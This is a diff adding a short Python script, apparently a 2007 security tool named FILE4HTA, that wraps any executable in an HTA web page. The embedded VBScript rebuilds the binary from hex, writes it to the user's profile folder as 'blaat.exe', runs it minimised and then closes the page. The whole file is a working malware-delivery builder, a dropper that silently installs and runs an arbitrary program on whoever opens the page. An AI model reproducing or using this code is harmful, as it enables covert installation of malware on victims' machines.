@@ -1,0 +1,93 @@
+#! /usr/bin/env python
+
+# FILE4HTA (c) 2007 DSquare Security
+#
+# Make a HTA page from an exe file
+# 
+
+import sys
+
+evilprog = "blaat.exe"
+
+if __name__ == "__main__":
+	
+	exe = ""
+
+	try:
+		exe = sys.argv[1]
+	except:
+		print "usage: file4hta.py <exe> <hta>\n"	
+		sys.exit(0)
+	
+	try:
+		f = open(exe, "r")
+	except:
+		print "can't open %s\n" % exe
+		sys.exit(0)
+	
+	e = []
+
+	buf = f.readlines()
+	for a in buf:
+		for b in a:
+			if b == "\r":
+				d = "0d"
+			elif b == "\n":
+				d = "0a"
+			elif b == "\0":
+				d = "00"
+			else:
+				c = hex(ord(b))
+				d = c.replace("0x", "")
+
+			if len(d) == 1:
+				d = "0"+d
+
+			e.append(d)
+	
+	f.close()
+
+	i = 0
+	j = 0
+	l = len(e)
+
+	hta = "<SCRIPT language=vbs>\n\n"
+	while 1:
+		hta += " prog = prog & \""
+
+		while i != 24:
+			hta += "%s," % e[j]
+			if j == l-1:
+				break
+			i += 1
+			j += 1
+
+		if j == l-1:
+			hta = hta[:-1] + "\"\n\n"
+			break
+		hta += "\"\n"
+		i = 0
+
+	hta += " tmp = Split(prog, \",\")\n"	
+	hta += " Set fso = CreateObject(\"Scripting.FileSystemObject\")\n"
+	hta += " Set shell = CreateObject(\"WScript.Shell\")\n"
+	hta += " userprofile = shell.ExpandEnvironmentStrings(\"%USERPROFILE%\")\n"
+	hta += " path = userprofile & \"\\\" & \"%s\"\n" % evilprog
+	hta += " Set f = fso.CreateTextFile(path, True)\n\n"
+	hta += " For i = 0 To UBound(tmp)\n"
+	hta += "   prog = Int(\"&H\" & tmp(i))\n"
+	hta += "   f.Write Chr(prog)\n"
+	hta += " Next\n\n"
+	hta += " f.Close\n"
+	hta += " shell.Run Chr(34) & path & Chr(34), 7, false\n"
+	hta += " self.Close\n"
+	hta += "</SCRIPT>\n"
+
+	try:
+		f = open(sys.argv[2], "w")
+	except:
+		print "can't open %s\n" % exe
+		sys.exit(0)
+
+	f.write(hta)
+	f.close()
